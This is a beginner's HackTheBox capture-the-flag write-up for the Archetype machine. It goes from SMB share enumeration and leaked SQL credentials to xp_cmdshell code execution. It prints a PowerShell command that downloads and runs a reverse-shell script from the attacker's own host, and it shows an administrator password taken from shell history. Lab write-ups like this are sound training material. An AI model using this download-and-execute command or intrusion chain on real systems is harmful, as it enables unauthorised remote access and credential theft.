## Archetype

Scanned this machine with nmap, identified 4 open ports:

```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
```

Started by connecting to the open SMB port (445, microsoft-ds (data services)) with smbclient. Enumerated the open shares on the system, which included:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

ADMIN$ and C$ don't allow unauthenticated connections. backups and IPC$ allow unauthenticatied connections, however only backups allows an unauthenticated user to list files and directories. In backups, we found a file called prod.dtsConfig, which appeared to contain SQL credentials, which were:

u/n: ARCHETYPE\sql_svc
p/w: M3g4c0rp123

One of the open ports we found with nmap was a SQL instance, and we were able to connect to it using the credentials we found. Once connected, we were able to enable the legacy xp_command_shell feature, which allowed us to arbitrarily execute programs. Given our users's permissions level, we were not able to kill key processes run by accounts with higher privelages. We attempted to get a reverse shell using some well-known powershell scripts we got from Github, but we encountered issues with Windows Defender identifying our commands as malicious. We then attempted using the script contained in the HTB official writeup, which was permitted, and provided us with the shell we wanted. The script is shell.ps1 in this directory, we hosted it on our machine using `sudo python3 -m http.server 80` and executed it on the target machine like so:

```
xp_cmdshell powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.130/shell.ps1\");"
```

This allowed us to find the user flag on the system. It was a text file on the sql_svc user's Desktop. It also allowed us to look at the shell history for the machine, which provided us with the administrator user's password:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

With the administrator user's password, we were able to use psexec to connect to the machine. We found the machine flag in C:\Users\Administrator\Desktop\root.txt, and read it with our psexec shell with `type`.  This completed this machine, which was my introduction to HackTheBox. On to the next one!
